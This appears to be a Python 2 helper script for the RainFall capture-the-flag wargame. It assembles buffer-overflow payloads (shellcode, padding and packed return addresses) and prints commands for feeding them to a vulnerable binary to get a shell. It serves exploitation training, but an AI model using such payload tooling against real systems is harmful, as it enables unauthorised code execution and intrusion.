#!/usr/bin/env python2
# =============================================================================
#  payload.py -- build a classic buffer-overflow payload.
#  Python 2, STANDARD LIBRARY ONLY (just `struct`). No pip install needed.
# -----------------------------------------------------------------------------
#  It builds exactly this shape:
#
#      payload = shellcode + fill*(offset - len(shellcode)) + addr1 + addr2 ...
#
#  - No shellcode + one address   -> ret2func   (e.g. level1)
#  - Shellcode + one address      -> shellcode on stack/heap (e.g. level2)
#  - Several addresses            -> ret chains / ret2libc (system, ret, arg)
#
#  It does NOT fit format-string levels (level3/4/5) or logic levels
#  (level0/level8) -- those need input crafted by hand.
#
#  YOU provide the offset and the address. This script only assembles the bytes
#  and reverses the address to little-endian for you -- it does not find them.
# =============================================================================

import struct


def pack_addr(text):
    # "0x08048444" (how gdb shows it) -> "\x44\x84\x04\x08" (little-endian, 32-bit)
    value = int(text.strip().lower().replace("0x", ""), 16)
    return struct.pack("<I", value)


def main():
    print "=== RainFall payload builder (python2, stdlib only) ==="

    # 1) how many bytes until we reach the saved return address
    offset = int(raw_input("Offset (bytes before the return address): ").strip())

    # 2) the address(es) to overwrite it with, in gdb hex form, space-separated
    addr_text = raw_input("Address(es) in hex, space-separated (e.g. 0x08048444): ").strip()
    addresses = "".join(pack_addr(a) for a in addr_text.split())

    # 3) padding byte (default 'A' = 0x41, easy to spot in a crash)
    fill = raw_input("Fill byte [default 'A']: ") or "A"
    fill = fill[0]

    # 4) optional shellcode, pasted as hex like  6a0b5899...  (blank = none)
    sc_hex = raw_input("Shellcode as hex (blank for none): ").strip().replace(" ", "")
    shellcode = sc_hex.decode("hex") if sc_hex else ""

    if len(shellcode) > offset:
        print "ERROR: shellcode is %d bytes but offset is only %d." % (len(shellcode), offset)
        return

    payload = shellcode + fill * (offset - len(shellcode)) + addresses

    # 5) write raw bytes to a file (default /tmp/exploit)
    out = raw_input("Output file [default /tmp/exploit]: ").strip() or "/tmp/exploit"
    f = open(out, "wb")
    f.write(payload)
    f.close()

    print
    print "Wrote %d bytes to %s" % (len(payload), out)
    print "  layout: %d shellcode + %d fill + %d address" % (
        len(shellcode), offset - len(shellcode), len(addresses))
    print
    print "Use it with (pick the one that matches how the binary reads input):"
    print "  cat %s - | ./levelX      # stdin; the '-' keeps stdin open for a shell" % out
    print "  ./levelX $(cat %s)       # argv" % out
    print "  ./levelX \"$(cat %s)\"     # argv, single argument with spaces" % out


main()
